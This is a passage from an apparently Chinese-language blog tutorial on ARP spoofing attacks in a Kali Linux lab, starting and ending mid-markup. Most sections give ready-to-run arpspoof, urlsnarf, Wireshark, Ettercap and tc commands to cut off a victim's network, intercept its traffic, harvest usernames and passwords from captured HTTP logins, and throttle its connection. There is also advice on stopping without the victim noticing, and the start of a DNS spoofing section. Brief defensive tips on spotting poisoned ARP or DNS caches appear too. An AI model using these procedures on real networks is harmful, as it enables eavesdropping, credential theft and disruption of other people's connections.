-a</code>所有的接口都是一个网卡。通过ipconfig可以查看有多少张网卡，没有开的网卡在arp中没有接口。</li></ol><h3 id="3、ARP工作流程："><a href="#3、ARP工作流程：" class="headerlink" title="3、ARP工作流程："></a>3、ARP工作流程：</h3><p>通过ip -a可以查看到这块网卡的MAC地址</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、先查一下该机器有没有ip：<span class="number">192.168</span>.<span class="number">1.13</span>的mac地址</span><br><span class="line">arp -a</span><br><span class="line">如果有就先删除</span><br><span class="line">arp -d <span class="number">192.168</span>.<span class="number">1.13</span></span><br><span class="line"><span class="number">2</span>、在centos7上抓包</span><br><span class="line">tcpdump -i eth0 -nn arp </span><br><span class="line">或者</span><br><span class="line">tcpdump -i eth0 -nn arp <span class="keyword">and</span> host <span class="number">192.168</span>.<span class="number">1.13</span></span><br><span class="line"><span class="number">3</span>、ping以下这个IP</span><br><span class="line">ping <span class="number">192.168</span>.<span class="number">1.13</span></span><br><span class="line"><span class="number">4</span>、查看抓包结果</span><br></pre></td></tr></table></figure><h2 id="二、ARP断网攻击攻击"><a href="#二、ARP断网攻击攻击" class="headerlink" title="二、ARP断网攻击攻击"></a>二、ARP断网攻击攻击</h2><h3 id="1、arp断网攻击原理："><a href="#1、arp断网攻击原理：" class="headerlink" title="1、arp断网攻击原理："></a>1、arp断网攻击原理：</h3><p>向目标主机不断的发送ARP报文，然后将其报文中的网关Mac地址设置为攻击机的mac地址。之后目标机器想访问网络发送数据包时，都会发送到攻击机，然后攻击机只需要做一个丢弃数据包的命令的命令，就可以断掉目标主机的网络。</p><h3 id="2、Arpspoof介绍（kali自带）"><a href="#2、Arpspoof介绍（kali自带）" class="headerlink" title="2、Arpspoof介绍（kali自带）"></a>2、Arpspoof介绍（kali自带）</h3><p>arpspoof是ARP欺骗工具，攻击者通过毒化受害者ARP缓存，将网关MAC地址替换为攻击者的的MAC地址<br>从而截取受害者发送和收到的数据包，可获取受害者账户、密码等。<br>命令使用：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">arpspoof -i [<span class="class"><span class="keyword">interface</span>] -<span class="title">c</span> [<span class="title">own</span> | <span class="title">both</span>] -<span class="title">t</span> [<span class="title">target</span>] [-<span class="title">r</span>] <span class="title">host</span></span></span><br><span class="line"><span class="class">-<span class="title">i</span> ：指定网卡，后面<span class="title">interface</span>是网卡的名称</span></span><br><span class="line"><span class="class">-<span class="title">c</span> ：攻击机<span class="title">IP</span></span></span><br><span class="line"><span class="class">-<span class="title">t</span> ：目标机器的<span class="title">IP</span></span></span><br><span class="line"><span class="class">-<span class="title">r</span> ：网关<span class="title">IP</span></span></span><br><span class="line"><span class="class">如：<span class="title">arpspoof</span> -<span class="title">i</span> <span class="title">eth0</span> -<span class="title">r</span> 192.168.1.1 -<span class="title">t</span> 192.168.1.13</span></span><br></pre></td></tr></table></figure><h3 id="3、攻击流程："><a href="#3、攻击流程：" class="headerlink" title="3、攻击流程："></a>3、攻击流程：</h3><p>1、条件 ：只要同处在同一个局域网中就可以？（两台机器能ping通，同时看一下arp -a | findstr 网关IP）<br>2、kali进行断网攻击：arpspoof -i 网卡名称 -r 网关IP -t 目标机器的IP<br>3、win10查看网络连接和kali的网络连接<br>4、win10查看此时arp表<br>5、停止攻击：在kali中进行ctrl+C进行退出。</p><h3 id="4、ARP断网攻击的深入理解"><a href="#4、ARP断网攻击的深入理解" class="headerlink" title="4、ARP断网攻击的深入理解"></a>4、ARP断网攻击的深入理解</h3><p>kali攻击时：kali 不停的告诉win10网关的MAC地址变成了kali的MAC地址<br>kali 不停的告诉网关 win10的MAC地址变成了新的kali的MAC地址</p><h2 id="三、ARP攻击-urlsnarf流量攻击和分析"><a href="#三、ARP攻击-urlsnarf流量攻击和分析" class="headerlink" title="三、ARP攻击-urlsnarf流量攻击和分析"></a>三、ARP攻击-urlsnarf流量攻击和分析</h2><p> <strong>kali数据包转发：</strong>使得受害机察觉不到自己被攻击，出于安全考虑，linux系统默认是进制数据包转发的。所谓转发即当主机拥有多于一块的网卡时，其中一块收到数据包，根据数据包的目的ip地址将数据包发往本机的另一块网卡，该网卡根据路由表继续发送数据包。这通常是路由器所要实现的功能。我们需要手动开启转发功能。</p><h3 id="1、如何开启通信转发？"><a href="#1、如何开启通信转发？" class="headerlink" title="1、如何开启通信转发？"></a>1、如何开启通信转发？</h3><p>kali里有个<code>/proc/sys/net/ipv4/ip_forward</code>配置文件<br>其默认是0禁止端口转发，将其改成1开启端口转发。</p><h3 id="2、开启转发步骤"><a href="#2、开启转发步骤" class="headerlink" title="2、开启转发步骤"></a>2、开启转发步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查看当前时候开启了端口转发</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>、开启通信转发的命令</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward<span class="comment">//将1写入到后面的这个文件中，关闭就将0进行写入就行。</span></span><br><span class="line"><span class="number">3</span>、使用arpspoof发起ARP攻击</span><br><span class="line">arpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.11</span></span><br><span class="line"><span class="number">4</span>、win10验证是否转发成功</span><br><span class="line">在没开启端口转发之前进行ARP断网攻击，受害机是不能上网的。</span><br><span class="line">在开启端口转发之后发起ARP断网攻击，受害机依然能上网。</span><br></pre></td></tr></table></figure><h3 id="3、dsniff工具："><a href="#3、dsniff工具：" class="headerlink" title="3、dsniff工具："></a>3、dsniff工具：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、工具介绍：Dsniff是一个基于Unix系统网络嗅探工具，工具包含两个我们需要的两个工具包，arpspoof和urlsnarf。</span><br><span class="line"><span class="number">2</span>、安装方法：apt-get install dsniff</span><br><span class="line"><span class="number">3</span>、urlsnarf工具介绍</span><br><span class="line">urlsnarf -h</span><br><span class="line">urlsnarf [-n] [-i <span class="class"><span class="keyword">interface</span> | -<span class="title">p</span> <span class="title">pcapfile</span>] [-<span class="title">v</span>] <span class="title">pattern</span> [<span class="title">expression</span>]</span></span><br><span class="line"><span class="class">-<span class="title">n</span> ：表示不反查主机名</span></span><br><span class="line"><span class="class">-<span class="title">i</span> ：<span class="title">interface</span> 网卡接口名</span></span><br><span class="line"><span class="class">-<span class="title">p</span> ：<span class="title">pattern</span> 表示对过滤的内容使用的正则表达式</span></span><br><span class="line"><span class="class">-<span class="title">v</span> ：表示取相反，<span class="title">expression</span>是过滤语法，和<span class="title">tcpdump</span>的相同，请参考<span class="title">tcpdump</span>。</span></span><br></pre></td></tr></table></figure><h3 id="4、url-流量分析"><a href="#4、url-流量分析" class="headerlink" title="4、url 流量分析"></a>4、url 流量分析</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、概念：URL流量嗅探操作非常类似中间人攻击，通过目标主机将路由流量注入到因特网。是通过ARP注入实现的。</span><br><span class="line">url嗅探能够实时跟踪电脑中的数据流量信息，并且分析出它的类型和去向。从而获取你的上网信息。</span><br><span class="line"><span class="number">2</span>、攻击流程：</span><br><span class="line"><span class="number">1</span>、开启流量转发</span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>、开启ARP攻击</span><br><span class="line">arpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.136</span></span><br><span class="line"><span class="number">3</span>、捕获目标计算机的url</span><br><span class="line">urlsnarf -i eth0</span><br><span class="line"><span class="number">4</span>、靶机上网，访问网站</span><br><span class="line"><span class="number">1</span>、http:<span class="comment">//www.kangda.cn/#/user/login?redirect=http%3A%2F%2Fwww.kangda.cn....</span></span><br><span class="line"><span class="number">2</span>、http:<span class="comment">//blog.tianya.cn/</span></span><br><span class="line"><span class="number">5</span>、kali分析用户请求</span><br></pre></td></tr></table></figure><h2 id="四、ARP-wireshark获取用户数据"><a href="#四、ARP-wireshark获取用户数据" class="headerlink" title="四、ARP-wireshark获取用户数据"></a>四、ARP-wireshark获取用户数据</h2><p>Wireshark工具介绍：kali自带</p><h3 id="1、下载官网：wireshark-org"><a href="#1、下载官网：wireshark-org" class="headerlink" title="1、下载官网：wireshark.org"></a>1、下载官网：<a href="http://wireshark.org/">wireshark.org</a></h3><p>是非常流行的网络封装包分析软件<br>可以截取各种网络封包，显示网络封包的详细信息<br>可以在windows，linux和mac Os上运行。</p><h3 id="2、ARP攻击截获密码的步骤"><a href="#2、ARP攻击截获密码的步骤" class="headerlink" title="2、ARP攻击截获密码的步骤"></a>2、ARP攻击截获密码的步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、开启数据包转发：<span class="keyword">echo</span> <span class="number">1</span> &gt;&gt; /proc/sys/net/ipv4/ip_forward</span><br><span class="line"><span class="number">2</span>、开启ARP工具：arpspoof -i eth0 -r <span class="number">192.168</span>.<span class="number">1.1</span> -t <span class="number">192.168</span>.<span class="number">1.136</span></span><br><span class="line"><span class="number">3</span>、启动wireshark：wireshark</span><br><span class="line"><span class="number">4</span>、输入过滤条件：（ip.src==<span class="number">192.168</span>.<span class="number">1.136</span> <span class="keyword">or</span> ip.dst==<span class="number">192.168</span>.<span class="number">1.136</span>） <span class="keyword">and</span> tcp.port==<span class="number">80</span> <span class="keyword">and</span> http[<span class="comment">//抓取由192.168.136发出的和192.168.1.136接收的由80端口经过的http请求包](https://xn--192-gx3eu78dcrz.168.xn--136192-yg3jq5je0bt89o.168.1.xn--13680http-8p6of0f9w4f7ie2z3a6t4a7oeea074rt0qz75dpzq/)。（192.168.1.136是靶机）</span></span><br><span class="line"><span class="number">5</span>、靶机登陆后台系统：http:<span class="comment">//mng.517628.com/login.phphttp://vmims.eguagua.cn/#/Login</span></span><br><span class="line"><span class="number">6</span>、wireshark寻找用户的登陆信息。</span><br></pre></td></tr></table></figure><h3 id="3、wireshahrk过滤命令-讲解"><a href="#3、wireshahrk过滤命令-讲解" class="headerlink" title="3、wireshahrk过滤命令 讲解"></a>3、wireshahrk过滤命令 讲解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、过滤源ip、目的ip</span><br><span class="line">ip.dst==<span class="number">192.168</span>.<span class="number">1.136</span><span class="comment">//找目的地址</span></span><br><span class="line">ip.src==<span class="number">192.168</span>.<span class="number">1.136</span><span class="comment">//找源地址</span></span><br><span class="line"><span class="number">2</span>、端口过滤</span><br><span class="line">tcp.port==<span class="number">80</span><span class="comment">//源端口和目的端口都过滤</span></span><br><span class="line">tcp.dstport==<span class="number">80</span><span class="comment">//只过滤目的端口</span></span><br><span class="line">tcp.srcport==<span class="number">80</span><span class="comment">//只过滤源端口</span></span><br><span class="line"><span class="number">3</span>、协议过滤</span><br><span class="line">http、tcp、ssh</span><br><span class="line"><span class="number">4</span>、http.request.method=<span class="string">&quot;post&quot;</span> <span class="keyword">and</span> tcp.port==<span class="number">80</span>/<span class="number">443</span><span class="comment">//过滤post请求和端口号是80或者443的。</span></span><br><span class="line"><span class="number">5</span>、通过Wireshark进行arp过滤可以查看自己的电脑有没有被别人控制一直在发arp信息。看发送自己的MAC地址是不是自己的。如果不是自己的可能表示就被攻击了。</span><br></pre></td></tr></table></figure><h3 id="4、注意："><a href="#4、注意：" class="headerlink" title="4、注意："></a>4、注意：</h3><p>1、只能抓取http协议的，https协议的需要有证书和解密的key<br>2、http走的是80端口，https走的是443端口。<br>3、通过Wireshark进行arp过滤可以查看自己的电脑有没有被别人控制一直在发arp信息。看发送自己的MAC地址是不是自己的。如果不是自己的可能表示就被攻击了。</p><h2 id="五、ARP-Ettercap-截获流量信息"><a href="#五、ARP-Ettercap-截获流量信息" class="headerlink" title="五、ARP-Ettercap-截获流量信息"></a>五、ARP-Ettercap-截获流量信息</h2><h3 id="1、EtterCap-劫持用户流量工具介绍："><a href="#1、EtterCap-劫持用户流量工具介绍：" class="headerlink" title="1、EtterCap-劫持用户流量工具介绍："></a>1、EtterCap-劫持用户流量工具介绍：</h3><p>root下【ettercap -G】打开<br>EtterCap介绍：是一个基于ARP地址欺骗方式的网络嗅探工具，主要适用于交换局域网络。借助于EtterCap嗅探软件，渗透测试人员可以检测网络内明文数据通讯的安全性，<br>及时采取措施，避免敏感的用户名&#x2F;密码等数据以明文的方式进行传输。<br>EtterCap几乎是每个渗透测试人员必备的工具之一。</p><h3 id="2、Ettercap利用软件界面攻击和介绍"><a href="#2、Ettercap利用软件界面攻击和介绍" class="headerlink" title="2、Ettercap利用软件界面攻击和介绍"></a>2、Ettercap利用软件界面攻击和介绍</h3><p>1、启动界面：是选择网卡和是否使用桥接模式进行二选一</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sniffing at startup：开启嗅探模式</span><br><span class="line">primary <span class="class"><span class="keyword">interface</span>：选择网卡</span></span><br><span class="line"><span class="class"><span class="title">Bridged</span> <span class="title">sniffing</span>：是否开启桥接模式</span></span><br><span class="line"><span class="class"><span class="title">Bridged</span> <span class="title">interface</span>：桥接模式下的网卡</span></span><br><span class="line"><span class="class">配置完成之后，点击上方的【对勾】即可完成配置</span></span><br></pre></td></tr></table></figure><p>2、中间人攻击菜单</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、从左到右依次是：开始/暂停、扫描主机、主机列表、中间人攻击菜单、开始/停止攻击、更多选项</span><br><span class="line"><span class="number">2</span>、中间人攻击菜单：</span><br><span class="line">ARP poisoning：ARP攻击</span><br><span class="line">DNP poisoning：DNP攻击</span><br><span class="line">ICMP redirect：icmp重定向</span><br><span class="line">Port stealing：端口欺骗</span><br><span class="line">DHCP spoofing：DHCP欺骗</span><br><span class="line">stop MITM：停止攻击</span><br><span class="line">SSL intercept：ssl嗅探</span><br><span class="line"><span class="number">3</span>、更多选项</span><br><span class="line">Targets：攻击列表</span><br><span class="line">Hosts：显示主机列表</span><br><span class="line">Filters：载入二进制脚本</span><br><span class="line">Plugins：插件</span><br><span class="line">Logging：日志</span><br><span class="line"><span class="number">4</span>、hosts选项</span><br><span class="line">Hosts <span class="keyword">list</span>：扫描到的主机列表</span><br><span class="line">Enable ipv6 scan：扫描ipv6地址</span><br><span class="line">Scan <span class="keyword">for</span> hosts：扫描主机</span><br><span class="line">load hosts form file：从外部文件载入主机列表</span><br><span class="line">Save hosts to file：保存主机列表到文件</span><br><span class="line"><span class="number">5</span>、Targets选项</span><br><span class="line">Current targets：正在攻击的列表</span><br><span class="line">Select targets:：选择攻击列表</span><br><span class="line">Portocol：攻击协议</span><br><span class="line">Reverse matching：匹配规则</span><br><span class="line">Wipe targets：擦除攻击</span><br><span class="line"><span class="number">6</span>、View选项</span><br><span class="line">Connections：连接信息（跟哪个主机的哪个端口连着）</span><br><span class="line">Profiles：IP地址信息（属于哪个网站什么的）</span><br><span class="line">Statistics：统计信息（对一些包的信息）</span><br></pre></td></tr></table></figure><h3 id="3、ARP截获用户信息攻击步骤："><a href="#3、ARP截获用户信息攻击步骤：" class="headerlink" title="3、ARP截获用户信息攻击步骤："></a>3、ARP截获用户信息攻击步骤：</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、启动ettercap：</span><br><span class="line">ettercap -G</span><br><span class="line"><span class="number">2</span>、点击右上角的对勾开始扫描</span><br><span class="line">需要先进行网卡设置，下边是选用桥接模式</span><br><span class="line">通过【arp -a | findstr 网关ip】可以查看靶机的arp列表。</span><br><span class="line"><span class="number">3</span>、点击左上角的三个杠查看软件查询到的主机列表（不会实时刷新，需要进行重新点击三杠进行更新列表）</span><br><span class="line"><span class="number">4</span>、然后将网关加入到Target1、将目标靶机加入到Target2</span><br><span class="line">可以在右上角的三个点更多中进行当前Target查看</span><br><span class="line"><span class="number">5</span>、在右上角的地球的按钮是攻击列表，就可以进行对靶机的抓包。</span><br><span class="line">通过【arp -a | findstr <span class="number">192.168</span>.<span class="number">1.1</span>】来查看是否毒化</span><br><span class="line"><span class="number">6</span>、右边的目标是停止按钮，左边有暂停扫描按钮。先停止ARP攻击，再停止数据转发。</span><br><span class="line">注意：想停止攻击的时候，要先进行右边的停止按钮，在进行左边的暂停扫描按钮。这样靶机是不会有任何的察觉的。</span><br><span class="line">如果先进行左边的暂停扫描，就相当于发起了ARP断网攻击，会被对方察觉。</span><br></pre></td></tr></table></figure><h3 id="4、Ettercap利用命令行攻击"><a href="#4、Ettercap利用命令行攻击" class="headerlink" title="4、Ettercap利用命令行攻击"></a>4、Ettercap利用命令行攻击</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、运行命令讲解：好像不需要开启端口转发</span><br><span class="line">ettercap -i -eth0 -Tq -M arp:remote /<span class="title function_ invoke__">ip</span>(host)<span class="comment">//net gatmask/ &gt;&gt;b.txt</span></span><br><span class="line">T：指的是text文本模式</span><br><span class="line">q：指的是安静模式执行这个命令</span><br><span class="line">i：后面跟的是连接局域网的网卡</span><br><span class="line">M：后面跟的是指定使用arp的方式</span><br><span class="line">&gt;&gt;：输出文件</span><br><span class="line"><span class="number">2</span>、攻击命令</span><br><span class="line">攻击：ettercap -Tq -i eth0 -M arp:remote /<span class="number">192.168</span>.<span class="number">110.1</span>(网关IP)<span class="comment">// /192.168.110.11// &gt;&gt;b.txt</span></span><br><span class="line">只会将抓取的包输出到b.txt文件中，不能实时进行数据分析，只能从b.txt文件中进行分析</span><br><span class="line">监听：tail -f b.txt</span><br><span class="line">但是我们可以用这种命令同时的在另一个窗口中进行对b.txt文件进行监听，就可以起到实时监听的效果</span><br><span class="line">升级监听：tail -f b.txt | grep <span class="string">&quot;USER&quot;</span></span><br><span class="line">或者</span><br><span class="line">tail -f b.txt | grep <span class="string">&quot;CONTENT&quot;</span></span><br><span class="line">或者</span><br><span class="line">tail -f b.txt | egrep <span class="string">&quot;USER|CONTENT&quot;</span></span><br><span class="line">停止攻击：ctrl+c</span><br><span class="line">保存监听用户信息文件：就是对日志进行一个保存</span><br><span class="line">cat -n b.txt | egrep <span class="string">&quot;USER|CONTENT&quot;</span> &gt;arp.log</span><br><span class="line">-n:添加行号</span><br><span class="line">egrep：过滤规则</span><br><span class="line">&gt;:输出文件</span><br></pre></td></tr></table></figure><h2 id="六、ARP限制网速攻击"><a href="#六、ARP限制网速攻击" class="headerlink" title="六、ARP限制网速攻击"></a>六、ARP限制网速攻击</h2><h3 id="1、TC工具介绍"><a href="#1、TC工具介绍" class="headerlink" title="1、TC工具介绍"></a>1、TC工具介绍</h3><p>在Linux中，流量控制都是通过TC这个工具来完成的。通常，要对网卡进行流量控制的配置，需要进行如下的步骤：</p><ol><li><p>为网卡配置一个队列</p></li><li><p>在该队列中建立分类</p></li><li><p>根据需要建立子队和子分类</p></li><li><p>为每个分类建立过滤器</p></li><li><p>注意：在TC中使用下列的缩写表示相应的网络延迟：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">时间的计量单位：</span><br><span class="line">s、sec或者secs秒</span><br><span class="line">ms、msec或者msecs毫秒</span><br><span class="line">us、usec、usecs或者一个无单位数字微秒</span><br></pre></td></tr></table></figure></li></ol><h3 id="2、TC命令介绍"><a href="#2、TC命令介绍" class="headerlink" title="2、TC命令介绍"></a>2、TC命令介绍</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、限制网速<span class="number">200</span>ms延时</span><br><span class="line">tc qdisc add eth0 root netem delay <span class="number">200</span>ms</span><br><span class="line">qdisc：排队时间</span><br><span class="line">add：添加</span><br><span class="line">dev：设备（网卡）</span><br><span class="line">root：root用户身份</span><br><span class="line">netem delay：设置网络延时时间</span><br><span class="line"><span class="number">2</span>、取消限制网速<span class="number">200</span>ms延时</span><br><span class="line">tc qdisc del dev eth0 root netem delay <span class="number">200</span>ms</span><br><span class="line">del：删除</span><br><span class="line"><span class="number">3</span>、修改网络延时</span><br><span class="line">tc qdisc change dev eth0 root netem delay <span class="number">300</span>ms</span><br><span class="line">change：修改</span><br></pre></td></tr></table></figure><h3 id="3、ARP攻击限制网速的具体步骤"><a href="#3、ARP攻击限制网速的具体步骤" class="headerlink" title="3、ARP攻击限制网速的具体步骤"></a>3、ARP攻击限制网速的具体步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、开启端口转发</span><br><span class="line">cat /proc/sys/net/ipv4/ip_forward<span class="comment">//值为0表示没开启流量转发，为1表示开启</span></span><br><span class="line"><span class="keyword">echo</span> <span class="number">1</span> &gt; /proc/sys/net/ipv4/ip_forward<span class="comment">//开启流量转发</span></span><br><span class="line"><span class="number">2</span>、开启ARP攻击</span><br><span class="line">arpspoof -i eth0 -r 网关IP192.<span class="number">168.1</span>.<span class="number">1</span> -t 靶机IP192.<span class="number">18.1</span>.<span class="number">136</span></span><br><span class="line"><span class="number">3</span>、查看靶机当前的网速</span><br><span class="line">https:<span class="comment">//www.speedtest.cn</span></span><br><span class="line"><span class="number">4</span>、开启网络延迟限速</span><br><span class="line">tc qdisc add dev eth0 root netem delay <span class="number">500</span>ms</span><br><span class="line"><span class="number">5</span>、查看限速规则</span><br><span class="line">tc qdisc show</span><br><span class="line"><span class="number">6</span>、查看靶机当前的网速</span><br><span class="line">https:<span class="comment">//www.speedtest.cn7、修改网速限制</span></span><br><span class="line">tc qdisc change dev eth0 root netem delay <span class="number">800</span>ms<span class="comment">//时间越小对网速限制越大，时间越大，限速越大</span></span><br><span class="line"><span class="number">8</span>、查看限速规则</span><br><span class="line">tc qdisc show</span><br><span class="line"><span class="number">9</span>、查看靶机当前网速</span><br><span class="line">https:<span class="comment">//www.speedtest.cn</span></span><br><span class="line"><span class="number">10</span>、取消限制网速<span class="number">200</span>ms延时</span><br><span class="line">tc qdisc del dev eth0 root netem delay <span class="number">200</span>ms</span><br></pre></td></tr></table></figure><h3 id="4、限速原理讲解"><a href="#4、限速原理讲解" class="headerlink" title="4、限速原理讲解"></a>4、限速原理讲解</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">ARP攻击之前：靶机通过路由器转交给服务器，服务器将数据转交给我们的路由器，再由路由器转交给靶机</span><br><span class="line">ARP攻击之后：靶机将上网请求转发给攻击机，攻击机开启了数据转发，将数据转发给路由器，再由路由器转发给服务器。服务器将数据转发给路由器，路由器转发给攻击机，攻击机再转发给靶机。</span><br><span class="line">限速之前：靶机将数据发送到攻击机，通过队列直接转发到路由器，不耗时。</span><br><span class="line">限速之后：靶机将数据发送到攻击机，需要先在队列中进行<span class="number">500</span>ms的延时排队才能通过</span><br></pre></td></tr></table></figure><h2 id="七、ARP-DNS欺骗"><a href="#七、ARP-DNS欺骗" class="headerlink" title="七、ARP-DNS欺骗"></a>七、ARP-DNS欺骗</h2><h3 id="1、DNS概念："><a href="#1、DNS概念：" class="headerlink" title="1、DNS概念："></a>1、DNS概念：</h3><p>DNS称之为域名系统。本地默认占用53端口，它本身的实质上是一个域名和ip的数据库服务器，他要完成的任务就是帮我们把输入的域名转换成ip地址，之后通过ip寻址连接目标服务器。</p><p>在我们在浏览器中输入地址之后会：</p><ol><li>第一首先在DNS缓存表中进行寻找，第二在host配置表中进行查找，第三去DNS服务器中进行查找。</li><li>绑定的最近的DNS服务器绑定域名时，服务器会告诉DNS服务器当前绑定的ip是多少。</li><li>如果最近的DNS服务器没有的话，会将这个问题发送到其他的DNS服务器进行询问 。</li><li>然后通过ip地址找到你的MAC地址，通过MAC地址进行通讯。</li></ol><h3 id="2、DNS劫持"><a href="#2、DNS劫持" class="headerlink" title="2、DNS劫持"></a>2、DNS劫持</h3><p>又称之为域名劫持，将目标的DNS询问请求进行劫持，只能对网关和靶机进行欺骗。</p><p>危害：能进行钓鱼等，让靶机询问假网址。</p><p>ettercap劫持的原理：局域网劫持，攻击者通过伪装成网关，劫持受害者的网络请求，将网络请求拦截到指定的服务器</p><h3 id="3、ARP-DNS常用命令（win）"><a href="#3、ARP-DNS常用命令（win）" class="headerlink" title="3、ARP-DNS常用命令（win）"></a>3、ARP-DNS常用命令（win）</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>、查看DNS缓存表：ipconfig /displaydns</span><br><span class="line"><span class="number">2</span>、获取DNS地址：ping www.mashibing.com</span><br><span class="line"><span class="number">3</span>、刷新/删除DNS缓存：ipconfig /flushdns</span><br><span class="line">如果有<span class="number">192</span>等局域网开头的DNS缓存就说明可能被DNS攻击了。</span><br></pre></td></tr></table></figure><h3 id="4、ARP-DNS欺骗攻击步骤"><a href="#4、ARP-DNS欺骗攻击步骤" class="headerlink" title="4、ARP-DNS欺骗攻击步骤"></a>4、ARP-DNS欺骗攻击步骤</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span 